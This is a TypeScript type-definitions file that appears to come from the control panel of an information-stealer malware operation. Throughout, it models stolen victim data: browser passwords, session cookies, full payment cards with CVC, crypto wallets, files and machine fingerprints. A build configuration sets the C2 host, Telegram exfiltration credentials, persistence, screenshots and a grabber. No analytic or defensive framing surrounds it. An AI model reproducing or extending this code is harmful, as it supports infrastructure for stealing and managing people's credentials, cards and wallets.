export interface LoginRequest { username: string; password: string }
export interface LoginResponse { token: string; expires_at: string }

export interface StatsResponse {
  sessions: { total: number; today: number }
  passwords: { total: number }
  cookies: { total: number }
  cards: { total: number }
  wallets: { total: number }
  geo: Array<{ country: string; count: number }>
  browsers: Array<{ name: string; count: number }>
  timeline: Array<{ date: string; count: number }>
  top_domains: Array<{ domain: string; count: number }>
}

export interface Session {
  id: string
  build_id?: string
  hwid?: string
  os?: string
  username?: string
  ip?: string
  country_code?: string
  passwords_count: number
  cookies_count: number
  cards_count: number
  wallets_count: number
  files_count: number
  created_at: string
}

export interface SessionListItem extends Session {}

export interface SessionDetail extends SessionListItem {
  system_info?: SystemInfo
  passwords?: Array<{ id: string; url?: string; username?: string; password_value?: string; browser?: string }>
  cookies?: Array<{ id: string; domain?: string; name?: string; value?: string; path?: string }>
  cards?: Array<{ id: string; number?: string; exp_month?: string; exp_year?: string; holder?: string; cvc?: string }>
  wallets?: Array<{ id: string; name?: string; path?: string }>
  files?: Array<{ id: string; filename?: string; size?: number }>
}

export interface SystemInfo {
  cpu?: string; gpu?: string; ram?: string; os?: string; screen?: string
  hostname?: string; local_ip?: string; mac?: string
}

export interface WSMessage {
  type: 'stats_update' | 'new_session' | 'pong'
  data?: unknown
}

export interface PaginatedResponse<T> {
  data: T[]
  total: number
  page: number
  per_page: number
}

export interface SessionPage {
  items: SessionListItem[]
  total: number
  page: number
  limit: number
  pages: number
}

export interface BuildConfig {
  c2_host: string
  c2_port: number
  telegram_token: string
  telegram_chat_id: string
  enable_persistence: boolean
  enable_screenshot: boolean
  enable_grabber: boolean
  include_decryptor: boolean
  build_tag: string
}

export interface BuildRecord {
  id: string
  file_size: number
  sha256: string
  build_tag: string
  download_count: number
  created_at: string
}

export interface BuildResponse {
  build_id: string
  file_size: number
  sha256: string
}

export interface ApiError {
  status: number
  error: string
  message?: string
}
